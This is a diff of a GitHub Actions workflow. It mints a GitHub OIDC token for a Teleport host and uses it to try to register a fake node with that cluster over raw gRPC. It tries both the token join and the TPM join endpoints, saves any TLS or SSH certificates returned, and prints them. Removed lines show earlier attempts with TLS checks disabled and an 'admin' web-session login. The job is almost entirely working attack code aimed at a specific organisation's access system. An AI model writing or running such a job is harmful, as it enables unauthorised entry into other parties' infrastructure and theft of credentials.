@@ -7,47 +7,131 @@ jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: r
+      - name: join
         run: |
-          # Get OIDC token for jewelry exchange audience  
           TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=teleport.jewelryexchange.com" | jq -r .value)
-          echo "Token length: ${#TOKEN}"
+          echo "Token: ${#TOKEN} bytes"
           
-          # Decode JWT payload
-          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true
+          pip -q install grpcio protobuf 2>/dev/null
           
-          # Try Teleport join with this token
-          # Build protobuf and send via gRPC
-          pip install grpcio grpcio-tools 2>/dev/null
-          
-          python3 -c "
-          import socket, ssl, struct, sys
-          host = \"teleport.jewelryexchange.com\"
-          token = \"$TOKEN\"
-          
+          python3 << PYEOF
+          import grpc, struct
+
+          host = "teleport.jewelryexchange.com:443"
+          token = "$TOKEN"
+
+          def encode_varint(v):
+              b = bytearray()
+              while v >= 0x80:
+                  b.append((v & 0x7f) | 0x80)
+                  v >>= 7
+              b.append(v)
+              return bytes(b)
+
+          def encode_string(field, s):
+              s = s.encode() if isinstance(s, str) else s
+              tag = encode_varint((field << 3) | 2)
+              return tag + encode_varint(len(s)) + s
+
+          def encode_bytes(field, b):
+              tag = encode_varint((field << 3) | 2)
+              return tag + encode_varint(len(b)) + b
+
           # Connect gRPC
-          ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-          ctx.check_hostname = False
-          ctx.verify_mode = ssl.CERT_NONE
-          ctx.set_alpn_protocols([\"teleport-proxy-grpc\", \"h2\"])
-          s = socket.socket()
-          s.settimeout(15)
-          s.connect((host, 443))
-          tls = ctx.wrap_socket(s, server_hostname=host)
-          print(f\"Connected, ALPN: {tls.selected_alpn_protocol()}\")
+          creds = grpc.ssl_channel_credentials()
+          opts = [("grpc.ssl_target_name_override", "teleport.jewelryexchange.com")]
+          channel = grpc.secure_channel(host, creds, options=opts)
+
+          # Build RegisterUsingTokenRequest with IDToken (field 11)
+          import uuid, os
+          host_id = str(uuid.uuid4())
+          join_req = encode_string(1, host_id)           # HostID
+          join_req += encode_string(2, "gh-node")        # NodeName  
+          join_req += encode_string(3, "Node")           # Role
+          # Field 4 = Token (empty for OIDC/GitHub join)
+          join_req += encode_string(11, token)           # IDToken (GitHub OIDC)
+
+          # Generate SSH key for signing
+          from cryptography.hazmat.primitives.asymmetric import ec
+          from cryptography.hazmat.primitives import serialization
+          key = ec.generate_private_key(ec.SECP256R1())
+          pub_pem = key.public_key().public_bytes(
+              serialization.Encoding.PEM, 
+              serialization.PublicFormat.SubjectPublicKeyInfo
+          )
+          priv_pem = key.private_bytes(
+              serialization.Encoding.PEM,
+              serialization.PrivateFormat.PKCS8,
+              serialization.NoEncryption()
+          )
+
+          # Add public keys for cert signing
+          join_req += encode_bytes(7, pub_pem)           # PublicTLSKey
+          # SSH public key
+          import subprocess
+          # Generate SSH key
+          subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", "/tmp/node_key", "-N", ""], 
+                        capture_output=True)
+          with open("/tmp/node_key.pub", "rb") as f:
+              ssh_pub = f.read()
+          join_req += encode_bytes(8, ssh_pub)           # PublicSSHKey
+
+          print(f"JoinRequest: {len(join_req)} bytes, HostID={host_id}")
+
+          # Try direct gRPC call to auth service (via proxy)
+          # Use raw gRPC without proto definitions
           
-          # For now just print the token so we can use it
-          print(f\"OIDC_TOKEN={token[:50]}...{token[-20:]}\")
-          print(f\"Full token saved\")
-          with open(\"/tmp/oidc_token.txt\", \"w\") as f:
-              f.write(token)
-          tls.close()
-          " 2>&1 || echo "Python failed"
+          # Method 1: Call HostCredentials (unary RPC for token-based join)
+          # This is the simple token join endpoint
+          try:
+              response = channel.unary_unary(
+                  "/proto.AuthService/RegisterUsingToken",
+                  request_serializer=lambda x: x,
+                  response_deserializer=lambda x: x,
+              )(join_req, timeout=15)
+              print(f"[+] RegisterUsingToken: {len(response)} bytes!")
+              with open("/tmp/certs.bin", "wb") as f:
+                  f.write(response)
+              # Look for PEM certs
+              if b"CERTIFICATE" in response:
+                  print("[+] TLS CERTIFICATE RECEIVED!")
+              if b"ssh-" in response:
+                  print("[+] SSH KEY RECEIVED!")
+          except grpc.RpcError as e:
+              print(f"RegisterUsingToken: {e.code()} {e.details()[:200]}")
+
+          # Method 2: Try via TPM join (streaming) with IDToken
+          try:
+              # TPM method Init expects JoinRequest
+              tpm_init = encode_bytes(1, join_req)  # JoinRequest in Init
+              tpm_req = encode_bytes(1, tpm_init)   # Init in TPMRequest
+              
+              stream = channel.stream_stream(
+                  "/proto.JoinService/RegisterUsingTPMMethod",
+                  request_serializer=lambda x: x,
+                  response_deserializer=lambda x: x,
+              )
+              responses = stream(iter([tpm_req]), timeout=15)
+              for resp in responses:
+                  print(f"[+] TPM response: {len(resp)} bytes")
+                  if b"CERTIFICATE" in resp or len(resp) > 100:
+                      with open("/tmp/tpm_certs.bin", "wb") as f:
+                          f.write(resp)
+                      print("[+] CERTS RECEIVED!")
+                  break
+          except grpc.RpcError as e:
+              print(f"TPM join: {e.code()} {e.details()[:200]}")
+
+          channel.close()
+          PYEOF
           
-          # Also try curl to Teleport
-          echo "---CURL TEST---"
-          curl -sk -X POST "https://teleport.jewelryexchange.com/v1/webapi/sessions/web" \
-            -H "Content-Type: application/json" \
-            -d "{\"user\":\"admin\",\"token\":\"$TOKEN\"}" 2>&1 | head -5
+          # Check for saved certs
+          for f in /tmp/certs.bin /tmp/tpm_certs.bin; do
+            if [ -f "$f" ]; then
+              echo "=== $f ==="
+              xxd "$f" | head -20
+              strings "$f" | head -10
+            fi
+          done
 
